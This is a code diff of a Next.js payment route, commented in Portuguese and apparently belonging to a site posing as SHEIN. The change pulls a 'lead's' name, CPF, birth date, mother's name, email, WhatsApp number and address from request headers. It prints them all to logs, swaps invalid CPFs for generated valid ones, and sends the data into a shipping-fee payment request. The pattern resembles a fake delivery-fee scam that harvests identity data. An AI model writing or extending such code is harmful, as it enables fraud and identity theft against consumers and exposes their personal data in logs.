@@ -90,19 +90,77 @@ export async function POST(request: NextRequest) {
     const { access_token, account } = authData.data
     const isSimulation = authData.fallback || authData.data.working === "SIMULATION"
 
-    // Carregar dados do usuário do localStorage (simulado no servidor)
-    const userData = {
-      nome: "Cliente SHEIN",
-      cpf: "12345678901",
-      email: "cliente@shein.com.br",
-      telefone: "11999999999",
+    // Carregar dados reais do usuário coletados durante o fluxo
+    const getUserData = () => {
+      try {
+        // Dados do CPF (nome, CPF, data nascimento, nome da mãe)
+        const cpfDataStr = request.headers.get("x-cpf-data") || "{}"
+        const cpfData = JSON.parse(cpfDataStr)
+
+        // Email do formulário
+        const userEmail = request.headers.get("x-user-email") || ""
+
+        // WhatsApp da página manager
+        const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
+
+        // Endereço da página delivery-address
+        const deliveryAddressStr = request.headers.get("x-delivery-address") || "{}"
+        const deliveryAddress = JSON.parse(deliveryAddressStr)
+
+        return {
+          nome: cpfData.nome || "Cliente SHEIN",
+          cpf: cpfData.cpf || "12345678901",
+          email: userEmail || "cliente@shein.com.br",
+          telefone: userWhatsApp || "11999999999",
+          dataNascimento: cpfData.dataNascimento || "",
+          nomeMae: cpfData.nomeMae || "",
+          endereco: {
+            rua: deliveryAddress.street || "Rua Exemplo",
+            numero: deliveryAddress.number || "123",
+            complemento: deliveryAddress.complement || "",
+            bairro: deliveryAddress.neighborhood || "Centro",
+            cidade: deliveryAddress.city || "São Paulo",
+            estado: deliveryAddress.state || "SP",
+            cep: deliveryAddress.zipCode?.replace(/\D/g, "") || "01000000",
+          },
+        }
+      } catch (error) {
+        console.log("⚠️ Erro ao carregar dados do usuário, usando fallback:", error)
+        return {
+          nome: "Cliente SHEIN",
+          cpf: "12345678901",
+          email: "cliente@shein.com.br",
+          telefone: "11999999999",
+          endereco: {
+            rua: "Rua Exemplo",
+            numero: "123",
+            bairro: "Centro",
+            cidade: "São Paulo",
+            estado: "SP",
+            cep: "01000000",
+          },
+        }
+      }
     }
+
+    const userData = getUserData()
+
+    console.log("📋 Dados do lead carregados:")
+    console.log("Nome:", userData.nome)
+    console.log("CPF:", userData.cpf)
+    console.log("Email:", userData.email)
+    console.log("Telefone:", userData.telefone)
+    console.log("Endereço:", userData.endereco)
 
     // Validar e corrigir CPF se necessário
     let document = userData.cpf?.replace(/[^\d]/g, "") || ""
     if (!validateCPF(document)) {
       console.log("⚠️ CPF inválido, gerando CPF válido para teste")
+      console.log("CPF original:", userData.cpf)
       document = generateValidCPF()
+      console.log("CPF gerado:", document)
+    } else {
+      console.log("✅ CPF válido:", document)
     }
 
     // Usar o valor exato do frete selecionado
@@ -117,12 +175,12 @@ export async function POST(request: NextRequest) {
         phone: userData.telefone?.replace(/[^\d]/g, "") || "11999999999",
         ip: getClientIP(request),
         address: {
-          street: "Rua Exemplo",
-          number: "123",
-          district: "Centro",
-          city: "São Paulo",
-          state: "SP",
-          zipcode: "01000000",
+          street: userData.endereco.rua,
+          number: userData.endereco.numero,
+          district: userData.endereco.bairro,
+          city: userData.endereco.cidade,
+          state: userData.endereco.estado,
+          zipcode: userData.endereco.cep,
           country: "BRA",
         },
       },
